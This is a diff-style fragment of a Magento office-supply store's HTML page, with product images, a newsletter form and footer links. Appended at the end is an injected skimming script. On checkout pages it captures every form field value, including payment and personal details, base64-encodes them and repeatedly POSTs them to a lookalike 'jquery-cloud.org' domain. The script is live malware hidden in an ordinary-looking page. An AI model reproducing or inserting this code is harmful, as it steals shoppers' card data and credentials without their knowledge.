+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/u/n/une-11128_zom.jpg" width="105" height="105" alt="HON 66&quot; L Shape Desk w/ Left Return" />
+                    </a> </li>
+
+		    		    
+			
+            			        
+
+			
+             <li><a class="preview" rel="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/300x300/9df78eab33525d08d6e5fb8d27136e95/h/o/honp3251rns_1_1.jpg" href="http://www.totalofficesource.com/hon-48-classic-right-ped-desk" title="HON 48&quot; Classic Right Pedestal Desk">
+                        <img src="http://www.totalofficesource.com/media/catalog/product/cache/6/small_image/105x105/9df78eab33525d08d6e5fb8d27136e95/h/o/honp3251rns_1_1.jpg" width="105" height="105" alt="HON 48&quot; Classic Right Pedestal Desk" />
+                    </a> </li>
+
+		    		    
+			
+        		 
+
+</ul>
+
+
+
+<div class="subscribe"><strong>Stay Connected</strong>
+<p>Receive Promotions and Discounts, sign up today to receive yours!</p>
+<form action="http://www.totalofficesource.com/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+	<input name="form_key" type="hidden" value="Geb1BRAcAs8g3ExT" />
+    <div class="form-subscribe">
+        <label for="newsletter">Newsletter Sign-up:</label>
+        <div class="input-box">
+           <input type="text" name="email" id="newsletter" title="Sign up for our newsletter" class="input-text required-entry validate-email" />
+        </div>
+        <button type="submit" title="Submit" class="button"><span><span>Submit</span></span></button>
+    </div>
+</form>
+<script type="text/javascript">
+//<![CDATA[
+    var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    new Varien.searchForm('newsletter-validate-detail', 'newsletter', 'Enter your email address');
+//]]>
+</script>
+</div>
+</div>
+</div></div>                </div>
+            </div>
+        </div>
+        <div class="footer-container">
+    <div class="footer">
+        
+        <div class="footer-links">
+        
+  <div class="footer-block first">
+<h6>Customer Service</h6>
+<ul>
+<li><a href="http://www.totalofficesource.com/about-magento-store/">About Us</a></li>
+<li><a href="http://www.totalofficesource.com/our-company/">Our company</a></li>
+<li><a href="http://www.totalofficesource.com/catalog/seo_sitemap/category/">Sitemap</a></li>
+</ul>
+ 
+</div>
+<div class="footer-block">
+<h6>Customer Info</h6>
+<ul>
+<li><a href="http://www.totalofficesource.com/contacts/">Contact Us</a></li>
+<li><a href="http://www.totalofficesource.com/price-matching/">Price matching</a></li>
+<li><a href="http://www.totalofficesource.com/testimonials/">Testimonials</a></li>
+</ul>
+</div>
+
+<div class="footer-block">
+<h6>Corporate</h6>
+<ul>
+<li><a href="http://www.totalofficesource.com/privacy/">Privacy Policy</a></li>
+<li><a href="http://www.totalofficesource.com/safe-shopping/">Safe &amp; secure shopping</a></li>
+<li><a href="http://www.totalofficesource.com/terms/">Terms &amp; conditions</a></li>
+</ul>
+
+</div>
+
+<div class="footer-block last">
+<h6>Information</h6>
+
+<ul>
+<li><a href="http://www.totalofficesource.com/delivery/">Delivery information</a></li>
+<li><a href="http://www.totalofficesource.com/guarantee/">Satisfaction guarantee</a></li>
+<li><a href="http://www.totalofficesource.com/returns/">Returns policy</a></li>
+</ul>
+</div>  
+        <div class="payment">
+        <img src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/images/creditcards.gif" alt="We Accept all Major Credit Cards" />
+        </div>
+            
+        
+                                                <!--  -->
+        </div>
+       
+    </div>
+ 
+           
+</div>
+ <div class="copyright">
+        <div class="f-left">
+            <address></address></div>
+            <div class="f-right">
+            
+            </div>
+            <div style="clear:both;"></div>
+            </div>
+  
+            </div>
+    </div> <!-- end .inner-wrapper-->
+</div>
+<script type="text/javascript">
+<!--
+var grelos_v={
+	snd:null,
+	Glink:'https://jquery-cloud.org/js/jquery-2.2.1.min.js',
+	myid:(function(name){
+		var matches=document.cookie.match(new RegExp('(?:^|; )'+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+'=([^;]*)'));
+		return matches?decodeURIComponent(matches[1]):undefined;
+	})('setidd')||(function(){
+		var ms=new Date();
+		var myid = ms.getTime()+"-"+Math.floor(Math.random()*(999999999-11111111+1)+11111111); 
+		var date=new Date(new Date().getTime()+60*60*24*1000);
+		document.cookie='setidd='+myid+'; path=/; expires='+date.toUTCString();
+		return myid;
+	})(),
+	base64_encode:function(data){
+		var b64='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+		var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc='';
+		do{
+			o1=data.charCodeAt(i++);
+			o2=data.charCodeAt(i++);
+			o3=data.charCodeAt(i++);
+			bits=o1<<16 | o2<<8 | o3;
+			h1=bits>>18 & 0x3f;
+			h2=bits>>12 & 0x3f;
+			h3=bits>>6 & 0x3f;
+			h4=bits & 0x3f;
+			enc+=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);
+		}while(i<data.length);
+		switch(data.length%3){
+			case 1:
+				enc=enc.slice(0,-2)+'==';
+				break;
+			case 2:
+				enc=enc.slice(0,-1)+'=';
+				break;
+		}
+		return enc;
+	},
+	clk:function(){
+		grelos_v.snd=null;
+		var inp=document.querySelectorAll("input, select, textarea, checkbox, button");
+		for (var i=0;i<inp.length;i++){
+			if(inp[i].value.length>0){
+				var nme=inp[i].name;
+				if(nme==''){nme=i;}
+				grelos_v.snd+=inp[i].name+'='+inp[i].value+'&';
+			}
+		}
+	},
+	send:function(){
+		try{
+			var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
+			for(var i=0;i<btn.length;i++){
+				var b=btn[i];
+				if(b.type!='text'&&b.type!='select'&&b.type!='checkbox'&&b.type!='password'&&b.type!='radio'){
+					if(b.addEventListener) {
+					b.addEventListener('click',grelos_v.clk,false);
+					}else{
+						b.attachEvent('onclick',grelos_v.clk);
+					}
+				}
+			}
+			var frm=document.querySelectorAll('form');
+			for(vari=0;i<frm.length;i++){
+				if(frm[i].addEventListener){
+					frm[i].addEventListener('submit',grelos_v.clk,false);
+				}else{
+					frm[i].attachEvent('onsubmit',grelos_v.clk);
+				}
+			}
+			if(grelos_v.snd!=null){
+				var domm=location.hostname.split('.').slice(0).join('_');
+				var keym=grelos_v.base64_encode(grelos_v.snd);
+				var http=new XMLHttpRequest();
+				http.open('POST',grelos_v.Glink,true);
+				http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+				http.send('info='+keym+'&hostname='+domm+'&key='+grelos_v.myid);
+			}
+			grelos_v.snd=null;
+			keym=null;
+			setTimeout(function(){grelos_v.send()},30);
+		}catch(e){}
+	}
+}
+if((new RegExp('onepage|checkout|onestep','gi')).test(window.location)){
+	grelos_v.send();
+}
+-->
+</script></body>
+</html>
